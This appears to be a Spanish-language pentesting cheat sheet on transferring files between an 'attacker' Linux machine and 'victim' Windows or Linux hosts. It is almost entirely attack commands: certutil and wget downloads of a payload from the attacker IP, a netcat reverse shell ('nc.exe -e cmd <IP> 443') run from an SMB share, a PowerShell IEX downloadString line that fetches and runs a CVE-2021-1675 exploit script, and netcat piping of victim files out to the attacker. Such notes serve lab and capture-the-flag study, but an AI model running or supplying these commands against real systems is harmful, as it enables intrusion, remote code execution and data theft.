# Transferir archivos 

Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux 

## Linux a Windows 

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Windows 

C:\Temp
C:\Windows\Temp                          
```

```bash 
# Atacante Linux
2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
3. ❯ python3 -m http.server 80          # Creamos un servidor 
4. ❯ impacket-smbserver smbFolder --smb2support
```

```bash 
# Victima Windows 

1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir

2. ❯ certutil -urlcache -f http://IP/payload.exe payload.exe                  # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
	
3. ❯ certutil.exe -f -urlcache -split http://IP/payload.exe payload.exe       # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 

4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
```

```bash

❯ copy \❮IP❯\\smbFolder\\❮File.exe❯ ❮File.exe❯    # Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante

	# IP = IP de atacante
	# smbFolder = Nombre del folder del recurso compartido
	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado

❯ IEX(New-Object Net.WebClient).downloadString(‘http://<IP>/CVE-2021-1675.ps1’)  # Con este comando en la maquina victima podemos subir el script en powershell que esta cargado en nuestro servidor, colocando la IP de atacante y el script .ps1
```

## Linux a Linux

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Linux 

/var/tmp 
/dev/shm
```

```bash
# Atacante Linux

1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
2. ❯ nc -nlvp 443 > file.zip            # Se hace esto para descargar un archivo de la maquina victima con Netcat
```

```bash 
# Victima Linux

1. ❯ wget http://IP/payload.exe         # Para descargar el payload de la maquina Linux
2. ❯ nc IP 443 < File.zip               # Para pasar un archivo a la maquina de atacante 
```

## Compartir archivos en un SMB de Linux a Windows 
```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support # Creamos un servicio con SMB 

	# smbFolder = Nos creara un servicio compartido llamado 'smbFolder'
	# pwd = Sincronizado con la ruta absoluta actual 
	# smb2support = En Windows 10 le damos soporte a la version 2

❯ smbserver.py <FOLDERNAME> $(pwd)                 # Nos creamos un recurso de red compartido, sincronizado con la ruta actual en donde se encuentra el archivo a compartir
```

## Windows a Linux 

```bash 
# En la maquina Windows

1. ❯ scp -r File user@IP:dir/                  # Pasar una carpeta con muchos archivos

	# r = Recursivo
	# File = Nombre de la carpeta que contiene los archivos a pasar  
	# user = Usuario de la maquina Linux (Debemos conocer su passwd)
	# dir = Directorio en donde se colocara el archivo 

2. ❯ scp file.exe user@IP:/dir/destino/            # Pasar un archivo 

	# file.exe = Archivo a pasar
```